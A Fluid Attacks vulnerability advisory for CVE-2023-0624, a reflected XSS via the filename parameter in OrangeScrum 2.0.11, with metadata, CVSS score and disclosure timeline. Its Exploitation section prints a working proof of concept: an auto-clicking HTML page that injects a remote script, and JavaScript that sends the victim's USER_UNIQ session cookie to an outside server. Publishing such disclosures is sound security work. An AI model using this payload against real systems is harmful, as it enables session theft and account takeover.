---
slug: advisories/oberhofer/
title: OrangeScrum 2.0.11 - Reflected XSS via filename
authors: Carlos Bello
writer: cbello
codename: oberhofer
product: OrangeScrum 2.0.11
date: 2023-02-13 12:00 COT
cveid: CVE-2023-0624
severity: 7.3
description: OrangeScrum 2.0.11 - Reflected Cross-Site Scripting via filename
keywords: Fluid Attacks, Security, Vulnerabilities, Orangescrum, XSS
banner: advisories-bg
advise: yes
template: advisory
---

## Summary

|                       |                                                         |
| --------------------- | ------------------------------------------------------- |
| **Name**              | OrangeScrum 2.0.11 - Reflected XSS via filename         |
| **Code name**         | [Oberhofer](https://en.wikipedia.org/wiki/Oberhofer)    |
| **Product**           | OrangeScrum                                             |
| **Affected versions** | 2.0.11                                                  |
| **State**             | Public                                                  |
| **Release Date**      | 2023-02-13                                              |

## Vulnerability

|                       |                                                                                                        |
| --------------------- | -------------------------------------------------------------------------------------------------------|
| **Kind**              | Reflected cross-site scripting (XSS)                                                                   |
| **Rule**              | [008. Reflected cross-site scripting (XSS)](https://docs.fluidattacks.com/criteria/vulnerabilities/008)|
| **Remote**            | Yes                                                                                                    |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N                                                           |
| **CVSSv3 Base Score** | 7.3                                                                                                    |
| **Exploit available** | No                                                                                                     |
| **CVE ID(s)**         | [CVE-2023-0624](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0624)                          |

## Description

OrangeScrum version 2.0.11 allows an external attacker to obtain arbitrary
user accounts from the application. This is possible because the application
returns malicious user input in the response with the content-type set to
text/html.

## Vulnerability

This vulnerability occurs because the application returns malicious user input
in the response with the content-type set to text/html.

## Exploitation

To exploit this vulnerability, we only need to send the following malicious HTML
code to an application user.

### Exploit.html

```html
<!DOCTYPE html>
<html>
    <body>
        <a id="exploit" href="https://retr02332bughunter.orangescrum.com/defect/defects/download?filename=%3Cscript+type=%27text/javascript%27+src=%27https://retr02332.com/exploit-utils.js%27%3E%3C/script%3E"> Exploit</a>
        <script>
            document.getElementById("exploit").click();
        </script>
    </body>
</html>
```

The malicious JavaScript that we embed in the page is as follows.

### Exploit-utils.js

```js
function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
}

let sessionCookie = `USER_UNIQ=${getCookie("USER_UNIQ")}`;

fetch("https://retr02332.com/leak?"+sessionCookie);
```

Thus, when the user clicks on the malicious link, it will send its session
cookie to the attacker's server logs.

## Evidence of exploitation

![vulnerability-orangescrum](https://user-images.githubusercontent.com/51862990/216176343-4430e676-1622-4af1-a866-3f773e6f6682.png)

![POC-XSS-OrangeScrum](https://user-images.githubusercontent.com/51862990/219088654-19f5e13c-908f-4db1-b458-c2e23783e92b.gif)

![cookie-leak-orangescrum](https://user-images.githubusercontent.com/51862990/216176496-96c7ad03-4a72-4eb3-adad-1f614f8ff508.png)

## Our security policy

We have reserved the ID CVE-2023-0624 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: OrangeScrum 2.0.11

* Operating System: GNU/Linux

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://github.com/Orangescrum/orangescrum/>

## Timeline

<time-lapse
  discovered="2023-02-07"
  contacted="2023-02-07"
  replied="2023-02-07"
  confirmed=""
  patched=""
  disclosure="2023-02-13">
</time-lapse>
